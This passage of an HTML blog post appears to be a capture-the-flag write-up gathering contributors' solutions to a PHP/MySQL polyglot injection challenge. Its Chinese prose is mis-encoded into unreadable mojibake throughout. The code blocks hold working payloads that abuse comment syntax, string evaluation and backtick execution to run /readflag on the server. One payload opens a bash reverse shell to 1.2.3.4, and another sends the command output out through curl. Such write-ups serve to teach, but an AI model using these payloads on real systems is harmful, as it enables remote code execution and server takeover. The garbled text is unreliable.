&lt;p&gt;ÂêåÊ®£ÊòØÂà©Áî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; Ë®ªËß£Á¨¶ËôüÂº∑Ë°åÊßãÈÄ†ÂêàÊ≥ïÊü•Ë©¢Ôºå‰∏çÈÅéÊúâË∂£ÁöÑÊòØÔºåMySQL ÊîØÊè¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; ÂñÆË°åÁöÑË®ªËß£Á¨¶ËôüÔºåÊ≠§Ë®ªËß£Á¨¶ËôüÂêåÊ®£‰πüË¢´ PHP ÊîØÊè¥ÔºåÊâÄ‰ª•‰∏çÊúÉÂ∞éËá¥ PHP Ë™ûÊ≥ïÈåØË™§ÔºåÊúÄÂæåÈÇÑÂ§ö‰∫Ü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&amp;gt;&lt;/code&gt; Âº∑Ë°åÁµêÊùü PHP Á®ãÂºèÂçÄÂ°äÔºåÂÜ∑Áü•Ë≠òÊòØÂ¶ÇÊûúÁ®ãÂºèÁ¢ºÊòØ PHP Á®ãÂºèÂçÄÂ°äÂÖßÊúÄÂæå‰∏ÄË°åÁöÑË©±Ôºå‰∏çÂä† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; ‰∏¶‰∏çÊúÉÂ∞éËá¥Ë™ûÊ≥ïÈåØË™§Âî∑ :P&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by tree:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=null--+.$output=exec(&apos;/readflag&apos;)&amp;amp;id=

SQL: SELECT null-- .$output=exec(&apos;/readflag&apos;) FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;null-- .$output=exec(&apos;/readflag&apos;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰πüÊòØÁî®‰∫Ü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; Êää PHP Á®ãÂºèÁ¢ºÁöÑÈÉ®ÂàÜÂú® SQL Ë£°Èù¢ÈÅÆËîΩËµ∑‰æÜÔºåÂà©Áî®‰∫Ü null ÈóúÈçµÂ≠óËÆì SQL Êü•Ë©¢ÊúâÂõûÂÇ≥ÁµêÊûúÔºå‰ΩÜÂú® PHP ‰πã‰∏≠ÂçªËÆäÊàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$row-&amp;gt;null&lt;/code&gt; Â∞ç $row Áâ©‰ª∂Â≠òÂèñÂêçÁÇ∫ null ÁöÑÂ±¨ÊÄßÔºå‰ΩøÂæó PHP ‰πüËÉΩÂêàÊ≥ïÂü∑Ë°åÔºåÊúÄÂæåÂ∞áÊåá‰ª§Âü∑Ë°åÁµêÊûúË¶ÜËìã $output ËÆäÊï∏ÔºåËÆìÈ°åÁõÆÂπ´Âä©ÊàëÂÄëËº∏Âá∫ÁµêÊûú„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by cebrusfs (https://www.facebook.com/menghuan.yu):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=NULL;%20--%20$b;var_dump(exec(%22/readflag%22))&amp;amp;id=1

SQL: SELECT column=NULL; -- $b;var_dump(exec(&quot;/readflag&quot;)) FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;column=NULL; -- $b;var_dump(exec(&quot;/readflag&quot;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ê≠§Ëß£Ê≥ï‰πüÊòØÈ°û‰ººÁöÑÊÄùË∑ØÔºåÈÅãÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; ÈñâÂêàÂÜçÊπäÂá∫ÂêàÊ≥ï PHP Á®ãÂºèÁ¢ºÔºåÊúÄÂæåÁõ¥Êé•‰ΩøÁî® var_dump Âº∑Âà∂Ëº∏Âá∫ exec ÁöÑÂü∑Ë°åÁµêÊûú„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Jason3e7 (https://github.com/jason3e7):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=NULL;-- $id %2b system(&apos;/readflag&apos;);%23&amp;amp;id=1

SQL: SELECT NULL;-- $id + system(&apos;/readflag&apos;);# FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;NULL;-- $id + system(&apos;/readflag&apos;);#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄô‰πüÊòØÁõ∏‰ººÁöÑÊÄùË∑ØÔºåÊúâË∂£ÁöÑÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- $id&lt;/code&gt; ÈÄôÂÄãÈÉ®ÂàÜÔºåÂ§ßÂÆ∂‰∏ÄÂÆöË®òÂæó &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$id --&lt;/code&gt; ÊòØÈÅûÊ∏õÈÅãÁÆóÂ≠êÔºå‰ΩÜÊúâÊôÇÂèØËÉΩÊúÉÂøòË®ò &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- $id&lt;/code&gt; ‰πüÂêåÊ®£ÊòØÈÅûÊ∏õÈÅãÁÆóÂ≠êÔºåÊâÄ‰ª•ÈÄôÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; ÊúÉ‰ΩøÂæó MySQL Ë™çÁÇ∫ÊòØË®ªËß£ÔºåPHP Âçª‰ªçË™çÁÇ∫ÊòØÈÅûÊ∏õÈÅãÁÆóÂ≠ê‰∏¶Ê≠£Â∏∏Âü∑Ë°å‰∏ãÂéª„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by shoui:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&apos;/readflag&apos;).&quot;;&quot;;&amp;amp;id=1

SQL: SELECT null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&apos;/readflag&apos;).&quot;;&quot;; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&apos;/readflag&apos;).&quot;;&quot;;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂêåÊ®£ÈÅãÁî®Ë®ªËß£ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; ÈñâÂêà SQL ‰ΩÜ PHP ÂèàÊòØÈÅûÊ∏õÈÅãÁÆóÂ≠êÁöÑÁâπÊÄßÔºåËÄå system ÂèàÊúÉÂ∞áÊåá‰ª§Âü∑Ë°åÁµêÊûúÁõ¥Êé•Ëº∏Âá∫ÔºåÂõ†Ê≠§Â∞±ËÉΩÁõ¥Êé•ÂèñÂæó flag„ÄÇÊú¨‰∫∫ÊúâË£úÂÖÖË™™ÊòéÁï∂ÊôÇÊ∏¨Ë©¶ÊôÇÁõ¥Êé•Ë§áË£ΩË≤º‰∏äÂéüÂßãÁ¢ºÈÇ£Ë°åÊé•Ê∏¨Ë©¶ÔºåÂæå‰æÜ‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=1&amp;amp;column=null-- -&quot;1&quot;;&quot; &quot;.system(&apos;/readflag&apos;).&quot;;&quot;&lt;/code&gt; Á≤æÁ∞°ÂæåÁöÑ payload XD„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;double-quoted-string-evaluation&quot;&gt;Double-quoted String Evaluation&lt;/h3&gt;

&lt;p&gt;PHP ÊúÉËá™ÂãïÂú®Áî±ÈõôÂºïËôü„Äå‚Äù„ÄçÂåÖÂ§æÁöÑÂ≠ó‰∏≤‰∏≠ÔºåÂ∞ãÊâæ $ ÈñãÈ†≠ÁöÑÂ≠óË©ûÔºåÂ∞áÂÖ∂Ëß£ÊûêÊàêËÆäÊï∏ÂÜçÊääÂÄº‰ª£ÂÖ•Â≠ó‰∏≤‰∏≠ÔºåÈÄôÂÄãÂäüËÉΩÂ∞çÊñºÂø´ÈÄüËº∏Âá∫Â∑≤ÂÖÖÂàÜË∑≥ËÑ´ËôïÁêÜÁöÑËÆäÊï∏ÂÄºÈùûÂ∏∏ÊúâÂπ´Âä©ÔºåÂèØ‰ª•Â¢ûÂä†Á®ãÂºèÁ¢ºÂèØËÆÄÊÄßÔºõ‰ΩÜÂêåÊ®£Âú∞ÔºåÊàëÂÄë‰πüÂèØ‰ª•Âà©Áî®ÈÄôÂÄãÂäüËÉΩÂÅö‰∏Ä‰∏ãÊúâË∂£ÁöÑ‰∫ãÊÉÖÔºå‰æãÂ¶ÇÈÄôÊÆµ PHP Á®ãÂºèÁ¢º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$str = &quot;${phpinfo()}&quot;;&lt;/code&gt; Â∞±ÂèØ‰ª•Áõ¥Êé•Âü∑Ë°å phpinfo ÂáΩÂºèÔºåÂà©Áî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$str = &quot;${system(&apos;id&apos;)}&quot;;&lt;/code&gt; Â∞±ÂèØ‰ª•Âü∑Ë°åÁ≥ªÁµ±Êåá‰ª§ÔºõËÄåÂú® MySQL ‰∏≠ÔºåÈõôÂºïËôü„Äå‚Äù„ÄçÊÅ∞Â•Ω‰πüÂèØ‰ª•Ë¢´Áî®‰æÜË°®Á§∫Á¥îÂ≠ó‰∏≤ÔºåÊâÄ‰ª•ÊàëÂÄëÂ∞±ËÉΩÊßãÈÄ†Âá∫„ÄåMySQL Ë™çÁÇ∫ÊòØÁ¥îÂ≠ó‰∏≤ÔºåPHP ÂçªË™çÁÇ∫ÈúÄË¶ÅËß£ÊûêÂü∑Ë°å„ÄçÁöÑ Payload„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÆìÊàëÂÄëÂÖà‰æÜÁúãÁ¨¨‰∏ÄÂÄã‰æãÂ≠êÔºö&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by ginoah:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id=&quot;${system(&apos;/readflag&apos;)}&quot;&amp;amp;id=1

SQL: SELECT id=&quot;${system(&apos;/readflag&apos;)}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id=&quot;${system(&apos;/readflag&apos;)}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Â∞çÊñº SQL ËÄåË®ÄÔºåÂ∞±ÊòØÂõûÂÇ≥ id ËàáÂ≠ó‰∏≤ÊØîËºÉÁöÑÁµêÊûúÔºõ‰ΩÜÂ∞çÊñº PHP ËÄåË®ÄÔºå‰∏äËø∞ÁµêÊûúÊòØÂ∞áÈõôÂºïËôüÂ≠ó‰∏≤Ëß£ÊûêÂÆåÂæåÊâçË≥¶ÂÄºÁµ¶ËÆäÊï∏ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$row-&amp;gt;id&lt;/code&gt;ÔºåËÄåÁµêÊûúÂ∞±Â¶ÇÂêåÂâçÈù¢Ë™™ÁöÑÔºåÂÆÉÊúÉÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§ /readflagÔºåÈÇÑÊúÉÂ∞áÁµêÊûúËº∏Âá∫Ëá≥Á∂≤È†ÅÔºåÊâÄ‰ª•Â∞±ËÉΩÂèñÂæó flagÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Billy (https://github.com/st424204):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name%2b&quot;{$_POST[1]($_POST[2])}&quot;&amp;amp;id=1
POST: 1=system&amp;amp;2=/readflag

SQL: SELECT name+&quot;{$_POST[1]($_POST[2])}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;name+&quot;{$_POST[1]($_POST[2])}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂêåÊ®£Âà©Áî®ÈõôÂºïËôüÁâπÊÄßÔºå‰ΩÜÈÄôÂÄã‰æãÂ≠êÊßãÈÄ†ÁöÑËºÉÁÇ∫Ë§áÈõúÔºåÂà©Áî®‰∫Ü‰∏Ä‰∫õÈ¨ÜËªüÁâπÊÄßÔºåÂú® PHP ‰∏≠ÔºåËã•Â≠ó‰∏≤ËÆäÊï∏ÊòØ‰∏ÄÂÄãÂ≠òÂú®ÁöÑÂáΩÂºèÁöÑÂêçÁ®±ÔºåÂâáÊàëÂÄëÂèØ‰ª•Âà©Áî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$func = &apos;system&apos;; $func(&apos;id&apos;);&lt;/code&gt; ÈÄôÊ®£ÁöÑÊñπÂºè‰æÜÂëºÂè´Ë©≤ËÆäÊï∏ÔºåÈÄôÂÄã‰æãÂ≠êÂ∞±ÊòØÊáâÁî®‰∫ÜÈÄôÂÄãÁâπÊÄßÔºåÂ∞áÊàëÂÄëÂæûÂâçÁ´ØÂÇ≥ÈÅûÈÅéÂéªÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_POST[1]&lt;/code&gt; Áï∂ÊàêÂáΩÂºèÂêçÁ®±„ÄÅ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_POST[2]&lt;/code&gt; ‰ΩúÁÇ∫ÂáΩÂºèÁöÑÂèÉÊï∏Âü∑Ë°åÔºåÂõ†Ê≠§Âè™Ë¶ÅÂèÉÊï∏ÂÜçÂ∏∂‰∏ä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1=system&amp;amp;2=readflag&lt;/code&gt; Â∞±ËÉΩÂèñÂæó flagÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Hans (https://hans00.me)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id||&quot;{$_POST[&apos;fn&apos;]($_POST[&apos;cmd&apos;])}&quot;&amp;amp;id=1
POST: fn=system&amp;amp;cmd=/readflag

SQL: SELECT id||&quot;{$_POST[&apos;fn&apos;]($_POST[&apos;cmd&apos;])}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id||&quot;{$_POST[&apos;fn&apos;]($_POST[&apos;cmd&apos;])}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÂÄã‰æãÂ≠êËàáÂâç‰∏ÄÂÄãÂà©Áî®‰∫ÜÂêåÊ®£ÁöÑÁâπÊÄßÔºåÂ∑ÆÂà•Âú®ËàáÊ≠§ËôïÁöÑ Payload ÊîπÁî® OR ÈÇèËºØÈÅãÁÆóÂ≠ê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;||&lt;/code&gt;ÔºåËÄåÂâçÈù¢‰ΩøÁî®ÁöÑÊòØÂä†Ê≥ïÁÆóË°ìÈÅãÁÆóÂ≠ê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt;Ôºå‰ΩÜÁµêÊûúÈÉΩÊòØÁõ∏ÂêåÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Chris Lin (https://github.com/kulisu)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=TRUE/&quot;${system(%27/readflag%27)}&quot;;%23&amp;amp;id=1

SQL: SELECT TRUE/&quot;${system(&apos;/readflag&apos;)}&quot;;# FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;TRUE/&quot;${system(&apos;/readflag&apos;)}&quot;;#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄô‰πüÊòØÁî®Áõ∏ÂêåÊ¶ÇÂøµÔºåÂâçÈù¢ÊîπÁî®Èô§Ê≥ïÁÆóË°ìÈÅãÁÆóÂ≠ê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;„ÄÇÁúãÂÆåËß£Ê≥ïÊâçÁôºÁèæÊäïÁ®øËÄÖÊòØÂêå‰∫ãÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201030/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;execution-operator&quot;&gt;Execution Operator&lt;/h3&gt;

&lt;p&gt;Âú® PHP ‰∏≠Â≠òÂú®ÁúæÂ§öÂáΩÂºèÂèØ‰ª•Âü∑Ë°åÁ≥ªÁµ±Êåá‰ª§ÔºåÂÖ∂‰∏≠ÈÇÑÂåÖÊã¨‰∏ÄÂÄãÁâπÊÆäÁöÑ &lt;a href=&quot;https://www.php.net/manual/en/language.operators.execution.php&quot;&gt;Execution Operator&lt;/a&gt;ÔºåÊ≠§ÈÅãÁÆóÂ≠êÁöÑÂΩ¢ÂºèÊòØÂà©Áî®ÂèçÂºïËôü„Äå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;`&lt;/code&gt;„ÄçÂ∞áÂ≠ó‰∏≤ÂåÖÂ§æËµ∑‰æÜÔºåÈÄôÊ®£Ë©≤Â≠ó‰∏≤Â∞±ÊúÉË¢´Áï∂‰ΩúÁ≥ªÁµ±Êåá‰ª§Âü∑Ë°åÔºåÂÖ∂ÂÖßÈÉ®ÂØ¶ÈöõÊòØÂü∑Ë°å shell_execÔºåÊõ¥Ë≤ºÂøÉÁöÑ‰∫ãÊÉÖÊòØÔºåÈÄôÂÄãÈÅãÁÆóÂ≠êÂêåÊ®£ÊîØÊè¥ Double-quoted String EvaluationÔºåÊâÄ‰ª•Ëã•ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$cmd = &apos;id&apos;; echo `$cmd`;&lt;/code&gt; ÈÄôÊ®£ÁöÑÂΩ¢ÂºèÔºåPHP Â∞±ÊúÉÂÖàËß£Êûê $cmd ÂæóÂá∫ idÔºåÂÜçÂü∑Ë°å id Á≥ªÁµ±Êåá‰ª§ÔºõËÄåÂú® MySQL ‰πã‰∏≠ÔºåÂèçÂºïËôüÊòØÁî®‰æÜË°®Á§∫‰∏ÄÂÄã identifierÔºåidentifier Áî®‰æÜÊåáÁ§∫‰∏ÄÂÄãÁâ©‰ª∂ÔºåÊúÄÂ∏∏Ë¶ãÁöÑÊòØË≥áÊñôË°®ÊàñÊòØË≥áÊñôÊ¨ÑÔºåÁï∂ÊàëÂÄëÂü∑Ë°å &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT c FROM t&lt;/code&gt;ÔºåÂÖ∂‰∏≠ c Âíå t Â∞±ÊòØ identifierÔºåÊâÄ‰ª•Ëã•ÊÉ≥Èù† Execution Operator ‰æÜÂü∑Ë°åÊåá‰ª§ÔºåÂèØËÉΩÈÇÑÂøÖÈ†àÂêåÊôÇËÆì identifier ËÉΩÂ§†Ë¢´ MySQL Ë≠òÂà•ÊâçË°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by dalun (https://www.nisra.net):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id=`$_POST[1]`%23?&amp;gt;&amp;amp;id=%0a+from+(select+&apos;id&apos;,&apos;$_POST[1]&apos;)+as+a+--+
POST: 1=/readflag

SQL: SELECT id=`$_POST[1]`#?&amp;gt; FROM mytable WHERE id = &apos;
     from (select &apos;id&apos;,&apos;$_POST[1]&apos;) as a -- &apos;
PHP: $output = $row-&amp;gt;id=`$_POST[1]`#?&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÂÄãËß£Ê≥ï‰ºº‰πéÊòØÂîØ‰∏ÄÈ°òÊÑè‰ΩøÁî® id ÂèÉÊï∏ÁöÑ XDÔºÅÂú® column ÂèÉÊï∏Áî®Ë®ªËß£Á¨¶Ëôü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; ÈñâÂêàÂæåÁ∫åÔºåÂú® id ÂèÉÊï∏ÊèíÂÖ•ÊèõË°åÁ¨¶Ëôü‰∏¶ÊßãÈÄ†‰∏ÄÂÄãÂêàÊ≥ïÁöÑ SQLÔºåÈÄèÈÅéÂ≠êÊü•Ë©¢Ë£ΩÈÄ†ÂêàÊ≥ïÁöÑ identifierÔºåÊúÄÂæåÁî± PHP ÈÄèÈÅé execution operator Âü∑Ë°åÁ≥ªÁµ±Êåá‰ª§„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by HexRabbit (https://twitter.com/h3xr4bb1t):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name+or+@`bash+-c+&quot;bash+-i+&amp;gt;%26+/dev/tcp/1.2.3.4/80+0&amp;gt;%261&quot;`&amp;amp;id=1

SQL: SELECT name or @`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1&quot;` FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;name or @`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1&quot;`;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÂÄãËß£Ê≥ïÊ†∏ÂøÉ‰πüÊòØÈÄèÈÅé execution oeperator Âü∑Ë°åÊåá‰ª§Ôºå‰∏çÈÅéÁî®‰∫Ü‰∏ÄÂÄãÁâπÊÆäÁöÑÂ≠óÂÖÉ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt;„ÄÇÂú® MySQL ‰∏≠ÔºåÈÄô‰ª£Ë°® user-defined variablesÔºåÂæåÈù¢ÁöÑÂ≠ó‰∏≤ÂâáÁÇ∫ËÆäÊï∏ÁöÑÂêçÁ®±ÔºåËÄå‰∏îÂêçÁ®±ÂèØ‰ª•‰ΩøÁî®ÁâπÊÆäÂ≠óÂÖÉÔºåÂè™Ë¶Å‰ΩøÁî® identifier ÁöÑÁ¨¶Ëôü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;`&lt;/code&gt; ÊääÂ≠ó‰∏≤ÂåÖÂ§æËµ∑‰æÜÂç≥ÂèØÔºåËÄåÂ≠òÂèñ‰∏çÂ≠òÂú®ÁöÑËÆäÊï∏‰∏¶‰∏çÊúÉÂ∞éËá¥ÈåØË™§ÔºåMySQL Âè™ÊúÉÂõûÂÇ≥ NULL ÁöÑÁµêÊûú„ÄÇÂú® PHP ‰∏≠ÁöÑË©±Ôºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt; ‰ª£Ë°® &lt;a href=&quot;https://www.php.net/language.operators.errorcontrol&quot;&gt;error control operator&lt;/a&gt;ÔºåÂèØ‰ª•ÊîæÁΩÆÂú®Ë°®ÈÅîÂºèÂâçÔºåÊúÉËÆì PHP Â∞áÊ≠§Ë°®ÈÅîÂºèÂü∑Ë°åÁî¢ÁîüÁöÑÈåØË™§Ë®äÊÅØÂÖ®ÈÉ®ÂøΩÁï•ÔºåÁî±ÊñºÊòØË°®ÈÅîÂºèÔºåÊâÄ‰ª•‰πüËÉΩÈôÑÂä†Âú® execution operator ‰πãÂâç„ÄÇÊúÄÂæåÈÄôÂÄãËß£Ê≥ïÂÜçÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;or&lt;/code&gt; ÈÇèËºØÈÅãÁÆóÂ≠êÔºàMySQL Ëàá PHP ÁöÜÊîØÊè¥‰∏¶‰∏îÊÑèÁæ©Áõ∏ÂêåÔºâ‰∏≤Êé•Âç≥ÂèØÈÅîÊàêÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by cjiso1117 (https://twitter.com/cjiso)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=$a%2b`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;%23&amp;amp;id=qwe

SQL: SELECT $a+`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;# FROM mytable WHERE id = &apos;qwe&apos;
PHP: $output = $row-&amp;gt;$a+`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂêåÊ®£ÊòØÂà©Áî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; Ë£ΩÈÄ†Âá∫ PHP Áúã‰∏çË¶ã„ÄÅMySQL ÁúãÂæóË¶ãÁöÑË®ªËß£ÊñáÂ≠ó‰æÜÊéßÂà∂Ë≥áÊñôÂ∫´Êü•Ë©¢ÁµêÊûúÔºåÊúÄÂæåÂà©Áî® execution operator ‰æÜÈÅîÊàêÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§Ôºå‰ΩÜÁî±Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;`&lt;/code&gt; ÂÖßÁöÑÊñáÂ≠óÊúÉË¢´ MySQL Ë™çÁÇ∫ÊòØ identifierÔºåÊâæ‰∏çÂà∞Â∞çÊáâË≥áÊ∫êÊúÉÂ∞éËá¥ÈåØË™§ÔºåÊâÄ‰ª•ÈÄèÈÅéÂ≠êÊü•Ë©¢Âíå alias Ë™ûÊ≥ïÂº∑Ë°åË£ΩÈÄ†Âá∫ identifier ËÆìÊü•Ë©¢Ê≠£Á¢∫Âü∑Ë°å„ÄÇ&lt;del&gt;Êú¨‰∫∫Ë°®Á§∫‰∏ÄÈñãÂßãË¶∫ÂæóÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; ÊúÉÂæàÂ∏•ÔºåÁµêÊûúËµ∞ÂÅèÁπû‰∫Ü‰∏ÄÂ§ßÂúà&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by shik (https://github.com/ShikChen/)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id%2b&quot;${print_r(`/readflag`)}&quot;&amp;amp;id=1

SQL: SELECT id+&quot;${print_r(`/readflag`)}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id+&quot;${print_r(`/readflag`)}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

